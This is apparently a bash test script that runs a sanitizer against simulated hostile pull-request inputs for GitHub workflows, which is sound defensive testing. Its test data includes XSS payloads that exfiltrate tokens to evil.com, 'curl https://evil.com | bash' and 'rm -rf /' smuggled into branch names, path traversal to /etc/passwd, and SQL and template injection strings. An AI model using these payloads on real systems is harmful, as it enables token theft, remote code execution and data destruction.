#!/bin/bash
###############################################################
# Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
###############################################################
#                 https://srd.cx
#
# Last Updated: 17-DEC-2025 1700Z by David Hoyt
#
# Intent: Try Sanitizing User Controllable Inputs
#
#
# 
#
# Comment: Sanitizing User Controllable Input 
#          - is a Moving Target
#          - needs ongoing updates
#          - needs additional unit tests
#
#
#
###############################################################
set -euo pipefail

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Source the sanitizer
if [ -r "$SCRIPT_DIR/sanitize.sh" ]; then
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/sanitize.sh"
else
  echo "ERROR: Cannot find sanitize.sh" >&2
  exit 1
fi

echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Hostile PR Attack Simulation Demo                       ║"
echo "║   Testing sanitization defenses                            ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_attack() {
  local name="$1"
  local attack="$2"
  local attack_type="$3"
  
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo -e "${YELLOW}Attack:${NC} $name"
  echo -e "${YELLOW}Type:${NC}   $attack_type"
  echo ""
  echo -e "${RED}Hostile Input:${NC}"
  echo "  $attack"
  echo ""
  
  # Sanitize the attack
  local sanitized
  sanitized=$(sanitize_line "$attack")
  
  echo -e "${GREEN}Sanitized Output:${NC}"
  echo "  $sanitized"
  echo ""
  
  # Check if attack was neutralized (look for unescaped HTML)
  # Safe: &lt;script or onerror= becomes onerror=&quot; or &#39;
  # Unsafe: <script or onerror=" (unescaped)
  if echo "$sanitized" | grep -qE '(<|>|onerror="|javascript:"[^&])' 2>/dev/null; then
    echo -e "${RED}❌ VULNERABLE - Attack not fully neutralized!${NC}"
    return 1
  else
    echo -e "${GREEN}✅ DEFENDED - Attack successfully neutralized${NC}"
  fi
  echo ""
}

echo "Simulating common attack vectors against PR workflows..."
echo ""

# Test 1: XSS Script Tag
test_attack \
  "XSS via Script Tag in Branch Name" \
  "<script>alert('Stolen Token: ' + document.cookie)</script>" \
  "Cross-Site Scripting"

# Test 2: XSS Event Handler
test_attack \
  "XSS via Event Handler in Actor Name" \
  "<img src=x onerror=\"fetch('https://evil.com?token='+GITHUB_TOKEN)\">" \
  "Cross-Site Scripting + Token Exfiltration"

# Test 3: Command Injection
test_attack \
  "Command Injection via Branch Name" \
  "feature/fix; curl https://evil.com | bash #" \
  "Shell Command Injection"

# Test 4: Path Traversal
test_attack \
  "Path Traversal in Filename" \
  "../../../etc/passwd" \
  "Directory Traversal"

# Test 5: SQL Injection Pattern
test_attack \
  "SQL Injection in Commit Message" \
  "Fix bug' OR '1'='1'; DROP TABLE users; --" \
  "SQL Injection (would fail in shell context)"

# Test 6: LDAP Injection
test_attack \
  "LDAP Injection in Username" \
  "*()|&admin" \
  "LDAP Filter Injection"

# Test 7: Template Injection
test_attack \
  "Server-Side Template Injection" \
  "{{7*7}} \${7*7} <%= system('whoami') %>" \
  "Template/Expression Injection"

# Test 8: HTML Comment Smuggling
test_attack \
  "HTML Comment with Hidden Payload" \
  "<!-- <script>alert(1)</script> --> Innocent text" \
  "HTML Comment Injection"

# Test 9: Unicode Homograph
test_attack \
  "Unicode Homograph Attack" \
  "аdmin-privilege" \
  "Homograph Attack (Cyrillic 'a')"

# Test 10: ANSI Escape Code
test_attack \
  "ANSI Escape Code Injection" \
  $'\033[31mCRITICAL ERROR\033[0m \033[32mAll tests passed\033[0m' \
  "ANSI Terminal Escape Codes"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Real-World Scenario: Hostile PR Workflow                ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

echo "Simulating a complete hostile PR scenario..."
echo ""

# Simulate GitHub context variables from a malicious PR
GITHUB_ACTOR="<script>alert('xss')</script>"
GITHUB_HEAD_REF="feature/fix; rm -rf / #"
GITHUB_BASE_REF="master"
GITHUB_EVENT_NAME="pull_request"
COMMIT_MSG="Fix critical bug' OR 1=1--"

echo "Malicious PR context:"
echo "  Actor:      $GITHUB_ACTOR"
echo "  Branch:     $GITHUB_HEAD_REF"
echo "  Commit Msg: $COMMIT_MSG"
echo ""

# What workflows do: sanitize before use
echo "Workflow sanitizes all user input:"
echo ""

safe_actor=$(sanitize_line "$GITHUB_ACTOR")
safe_branch=$(sanitize_ref "$GITHUB_HEAD_REF")
safe_commit=$(sanitize_line "$COMMIT_MSG")

echo "Sanitized values:"
echo "  Actor:      $safe_actor"
echo "  Branch:     $safe_branch"
echo "  Commit Msg: $safe_commit"
echo ""

# Simulate writing to GITHUB_STEP_SUMMARY
SUMMARY_FILE=$(mktemp)
{
  echo "## PR Information"
  echo ""
  echo "**Submitted by:** $safe_actor"
  echo "**Branch:** \`$safe_branch\`"
  echo "**Commit:** $safe_commit"
  echo ""
} > "$SUMMARY_FILE"

echo "Generated workflow summary (GITHUB_STEP_SUMMARY):"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
cat "$SUMMARY_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Verify no XSS in summary (check for unescaped HTML)
if grep -qE '(<script|<img|onerror="|javascript:"[^&])' "$SUMMARY_FILE"; then
  echo -e "${RED}❌ VULNERABLE - XSS payload found in summary!${NC}"
  rm -f "$SUMMARY_FILE"
  exit 1
else
  echo -e "${GREEN}✅ SECURE - Summary is safe for display in GitHub UI${NC}"
fi

rm -f "$SUMMARY_FILE"
echo ""

echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Validation: Without Sanitization (DANGEROUS)            ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

echo "What would happen WITHOUT sanitization:"
echo ""
echo -e "${RED}UNSAFE workflow step:${NC}"
echo '```yaml'
echo 'run: |'
echo '  echo "## PR from ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY'
echo '```'
echo ""
echo "Would produce:"
echo "  ## PR from <script>alert('xss')</script>"
echo ""
echo -e "${RED}Result: XSS vulnerability in GitHub UI!${NC}"
echo ""

echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Summary                                                  ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo -e "${GREEN}✅ All attacks successfully defended against${NC}"
echo ""
echo "Defense mechanisms:"
echo "  1. HTML entity escaping (< > & \" ')"
echo "  2. Control character removal (NUL, CR, ANSI codes)"
echo "  3. Length limiting (prevents DoS)"
echo "  4. Trusted sanitizer loading (from base commit)"
echo "  5. Shell hardening (--noprofile --norc)"
echo "  6. Token unset (GITHUB_TOKEN explicitly cleared)"
echo ""
echo "To test in your workflows:"
echo "  1. Run: .github/scripts/test_sanitization.sh"
echo "  2. Use workflow: test-hostile-pr.yml"
echo "  3. Follow guide: .github/docs/SECURITY_TESTING.md"
echo ""
